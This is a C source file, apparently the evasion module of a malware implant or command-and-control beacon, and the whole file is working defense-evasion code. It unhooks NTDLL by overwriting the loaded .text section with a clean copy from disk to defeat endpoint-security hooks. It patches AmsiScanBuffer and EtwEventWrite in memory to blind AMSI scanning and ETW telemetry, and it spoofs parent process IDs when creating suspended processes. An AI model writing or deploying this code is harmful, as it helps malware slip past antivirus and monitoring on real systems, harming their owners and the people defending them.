// src/evasion.c
// Mod 83/84: NTDLL unhooking | Mod 105/110: AMSI/ETW patching | Mod 47: PPID spoofing
#include <windows.h>
#include "ntdefs.h"
#include <stdio.h>
#include<intrin.h>
#define NTDLL_NAME "NTDLL.DLL"
#define MAP_NTDLL

// NTDLL
/*
1. Open a fresh copy of ntdll.dll from disk
2. Map it into memory
3. Compare .text section to loaded (hooked) NTDLL
4. Overwrite hooked bytes with clean bytes
5. Call this ONCE before your beacon loop starts
*/

// ── Step 1: Map a clean copy of ntdll.dll from disk ─────────────
BOOL MapNtdllFromDisk(OUT PVOID *ppNtdllBuf) {
  HANDLE hFile = NULL;
  HANDLE hSection = NULL;
  CHAR cWinPath[MAX_PATH / 2] = {0};
  CHAR cNtdllPath[MAX_PATH] = {0};
  PBYTE pNtdllBuffer = NULL;

  // get Windows directory (e.g. C:\Windows)
  if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
    printf("[!] GetWindowsDirectoryA Failed With Error : %d \n",
           GetLastError());
    goto _EndOfFunc;
  }

  // build full path: C:\Windows\System32\NTDLL.DLL
  sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath,
            NTDLL_NAME);
  printf("[*] Loading clean NTDLL from: %s\n", cNtdllPath);

  // open the file
  hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
    goto _EndOfFunc;
  }

  // create a read-only section mapping
  // SEC_IMAGE_NO_EXECUTE handles PE alignment automatically
  hSection = CreateFileMappingA(
      hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
  if (hSection == NULL) {
    printf("[!] CreateFileMappingA Failed With Error : %d \n", GetLastError());
    goto _EndOfFunc;
  }

  // map the view into our process
  pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
  if (pNtdllBuffer == NULL) {
    printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
    goto _EndOfFunc;
  }

  printf("[+] Clean NTDLL mapped at: 0x%p\n", pNtdllBuffer);
  *ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
  if (hFile)
    CloseHandle(hFile);
  if (hSection)
    CloseHandle(hSection);
  if (*ppNtdllBuf == NULL)
    return FALSE;
  return TRUE;
}

// ── Step 2: Get base address of the loaded (hooked) ntdll ────────
// ntdll is always the 2nd entry in InMemoryOrderModuleList
// (1st is the current process image)
PVOID FetchLocalNtdllBaseAddress() {
#ifdef _WIN64
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
  PLDR_DATA_TABLE_ENTRY pLdr =
      (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink
                                  ->Flink -
                              0x10);

  printf("[*] Loaded (hooked) NTDLL base: 0x%p\n", pLdr->DllBase);
  return pLdr->DllBase;
}

// ── Step 3: Overwrite hooked .text with clean .text ──────────────
BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
  PVOID pLocalNtdll = FetchLocalNtdllBaseAddress();

  // validate DOS header
  PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
  if (!pLocalDosHdr || pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
    printf("[!] Invalid DOS signature on loaded NTDLL\n");
    return FALSE;
  }

  // validate NT headers
  PIMAGE_NT_HEADERS pLocalNtHdrs =
      (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
  if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
    printf("[!] Invalid NT signature on loaded NTDLL\n");
    return FALSE;
  }

  PVOID pLocalNtdllTxt = NULL;  // hooked .text in memory
  PVOID pRemoteNtdllTxt = NULL; // clean .text from disk
  SIZE_T sNtdllTxtSize = 0;

  // find the .text section by name
  // (*(ULONG*)name | 0x20202020) == 'xet.' is a case-insensitive
  // little-endian compare for ".tex" — standard Maldev pattern
  PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
  for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
    if ((*(ULONG *)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
      pLocalNtdllTxt =
          (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
#ifdef MAP_NTDLL
      // MAP: VirtualAddress is valid directly — SEC_IMAGE_NO_EXECUTE handles
      // alignment
      pRemoteNtdllTxt =
          (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
#endif
      sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
      printf("[*] .text section found — VA: 0x%p | Size: %zu bytes\n",
             pLocalNtdllTxt, sNtdllTxtSize);
      break;
    }
  }

  // verify we found everything
  if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize) {
    printf("[!] Failed to locate .text section\n");
    return FALSE;
  }

  // make .text writable (PAGE_EXECUTE_WRITECOPY avoids CoW faults)
  DWORD dwOldProtection = 0;
  if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY,
                      &dwOldProtection)) {
    printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
    return FALSE;
  }

  // overwrite hooked bytes with clean bytes
  memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
  printf("[+] .text section overwritten with clean copy\n");

  // restore original memory protection
  if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection,
                      &dwOldProtection)) {
    printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
    return FALSE;
  }

  return TRUE;
}

// ── Wrapper: call this ONCE at top of beacon_run() ───────────────
BOOL unhook_ntdll() {
  PVOID pCleanNtdll = NULL;

  printf("[*] Starting NTDLL unhook...\n");

  // map clean copy from disk
  if (!MapNtdllFromDisk(&pCleanNtdll)) {
    printf("[!] MapNtdllFromDisk Failed\n");
    return FALSE;
  }

  // overwrite hooked .text with clean .text
  if (!ReplaceNtdllTxtSection(pCleanNtdll)) {
    printf("[!] ReplaceNtdllTxtSection Failed\n");
    UnmapViewOfFile(pCleanNtdll);
    return FALSE;
  }

  // unmap the clean copy — no longer needed
  UnmapViewOfFile(pCleanNtdll);

  printf("[+] NTDLL unhooked successfully\n");
  return TRUE;
}

// -- Mod 105: AMSI bypass (T1562.001) ---------------------------------
// Patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN
BOOL patch_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[*] patch_amsi: amsi.dll not loaded (not a PowerShell host)\n");
        return TRUE; // not an error
    }

    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[!] patch_amsi: AmsiScanBuffer not found\n");
        return FALSE;
    }

    // x64 patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect = 0;

    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] patch_amsi: VirtualProtect failed: %ld\n", GetLastError());
        return FALSE;
    }

    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] AMSI patched\n");
    return TRUE;
}

// -- Mod 110: ETW bypass (T1562.001) ----------------------------------
// Patches EtwEventWrite in ntdll to return immediately
BOOL patch_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[!] patch_etw: EtwEventWrite not found\n");
        return FALSE;
    }

    // xor eax, eax; ret (return STATUS_SUCCESS)
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    DWORD oldProtect = 0;

    if (!VirtualProtect(pEtwEventWrite, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] patch_etw: VirtualProtect failed: %ld\n", GetLastError());
        return FALSE;
    }

    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] ETW patched\n");
    return TRUE;
}

// -- Mod 47: PPID spoofing (T1036) ------------------------------------
// Creates a process with a spoofed parent PID
BOOL ppid_spoof(DWORD parentPid, LPCSTR targetExe,
                PPROCESS_INFORMATION pPi) {
    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)
        HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!si.lpAttributeList) return FALSE;

    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);
    if (!hParent) {
        printf("[!] ppid_spoof: OpenProcess(%ld) failed: %ld\n",
               parentPid, GetLastError());
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return FALSE;
    }

    UpdateProcThreadAttribute(si.lpAttributeList, 0,
                              PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent, sizeof(HANDLE), NULL, NULL);

    BOOL result = CreateProcessA(
        NULL, (LPSTR)targetExe, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL, NULL, &si.StartupInfo, pPi);

    if (!result) {
        printf("[!] ppid_spoof: CreateProcess failed: %ld\n", GetLastError());
    } else {
        printf("[+] ppid_spoof: Created PID %ld with PPID %ld\n",
               pPi->dwProcessId, parentPid);
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParent);
    return result;
}
BOOL evasion_run()
{
    if(!unhook_ntdll())
    {
        printf("[!] NTDLL unhook failed\n");
        return FALSE;
    }
    patch_amsi();
    patch_etw();
    printf("[+] Evasion complete\n");
    return TRUE;

}
